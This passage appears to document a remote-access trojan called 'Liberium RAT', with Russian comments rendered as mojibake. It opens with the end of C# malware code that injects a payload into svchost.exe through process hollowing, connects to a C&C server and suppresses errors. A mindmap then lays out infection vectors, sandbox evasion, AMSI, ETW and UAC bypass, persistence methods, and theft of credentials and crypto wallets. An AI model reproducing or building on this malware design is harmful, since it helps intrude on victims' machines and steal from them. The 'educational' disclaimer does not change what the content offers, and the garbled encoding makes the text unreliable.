            // Ğ˜Ğ½ÑŠĞµĞºÑ†Ğ¸Ñ Ğ² svchost.exe Ğ´Ğ»Ñ Ğ¼Ğ°ĞºÑĞ¸Ğ¼Ğ°Ğ»ÑŒĞ½Ğ¾Ğ¹ ÑĞºÑ€Ñ‹Ñ‚Ğ½Ğ¾ÑÑ‚Ğ¸
            RunPE.Execute(currentPayload, @"C:\Windows\System32\svchost.exe");
            return; // Ğ—Ğ°Ğ²ĞµÑ€ÑˆĞ°ĞµĞ¼ Ğ¾Ñ€Ğ¸Ğ³Ğ¸Ğ½Ğ°Ğ»ÑŒĞ½Ñ‹Ğ¹ Ğ¿Ñ€Ğ¾Ñ†ĞµÑÑ
        }

        // 5. ĞĞ¡ĞĞĞ’ĞĞĞ¯ Ğ›ĞĞ“Ğ˜ĞšĞ RAT
        Client.Run(); // ĞŸĞ¾Ğ´ĞºĞ»ÑÑ‡ĞµĞ½Ğ¸Ğµ Ğº C&C ÑĞµÑ€Ğ²ĞµÑ€Ñƒ
    }
    catch (Exception ex)
    {
        // Ğ¡ĞºÑ€Ñ‹Ğ²Ğ°ĞµĞ¼ Ğ²ÑĞµ Ğ¾ÑˆĞ¸Ğ±ĞºĞ¸
    }
}
```

### ğŸ”¥ **Ğ˜Ğ¢ĞĞ“ĞĞ’ĞĞ¯ Ğ¡Ğ¥Ğ•ĞœĞ: ĞĞ¢ Ğ—ĞĞ ĞĞ–Ğ•ĞĞ˜Ğ¯ Ğ”Ğ ĞšĞĞĞ¢Ğ ĞĞ›Ğ¯**

```mermaid
mindmap
  root((ğŸ”¥ LIBERIUM RAT<br/>COMPLETE TAKEOVER))
    ğŸ¯ INFECTION VECTOR
      ğŸ“§ Email Attachment
      ğŸŒ Drive-by Download
      ğŸ’¾ USB Propagation
      ğŸ¦  Network Worm
    ğŸš€ INITIAL EXECUTION
      ğŸ” Environment Check
        VM Detection
        Sandbox Evasion
        Analysis Tools
      ğŸ›¡ï¸ Security Bypass
        AMSI Patching
        ETW Bypass
        UAC Bypass
      âš™ï¸ Configuration
        C&C Servers
        Install Settings
        Mutex Creation
    ğŸ¦  PERSISTENCE LAYER
      ğŸ“ Registry Keys
        HKCU Run
        HKLM Run
        Legitimate Names
      â° Scheduled Tasks
        Every 5 minutes
        Random Names
        System Level
      ğŸ”§ Windows Service
        Auto Start
        System Service
        Hidden Process
      ğŸ“‚ Startup Folder
        User Autostart
        Hidden Files
        Fake Names
      ğŸ•·ï¸ AppInit DLLs
        Global Injection
        Every Process
        Deep Integration
      ğŸ‘ï¸ Watchdog System
        Process Monitor
        Auto Recovery
        Cross Protection
    ğŸ§¬ RUNPE INJECTION
      ğŸ¯ Target Selection
        svchost.exe
        explorer.exe
        Legitimate Processes
      ğŸ’€ Process Hollowing
        CREATE_SUSPENDED
        ZwUnmapViewOfSection
        Memory Injection
        Thread Resume
      ğŸ­ Stealth Execution
        Legitimate Process Name
        Hidden Malicious Code
        System-level Access
    ğŸŒ C&C COMMUNICATION
      ğŸ”’ SSL/TLS Encryption
      ğŸ“¡ Multiple Servers
      ğŸ†” Bot Registration
      ğŸ”§ Plugin Loading
    ğŸ’° PAYLOAD EXECUTION
      ğŸ’ Data Theft
        Browser Credentials
        Crypto Wallets
        Personal Files
      â›ï¸ Cryptocurrency Mining
        Hidden Processes
        Resource Optimization
        Pool Management
      ğŸ¦  Network Propagation
        SMB Exploitation
        USB Spreading
        Lateral Movement
      ğŸ® Remote Control
        HVNC Desktop
        File Management
        System Control
```

*âš ï¸ This documentation is for educational and research purposes only. The analyzed system demonstrates sophisticated malware techniques that should be studied to improve cybersecurity defenses.*
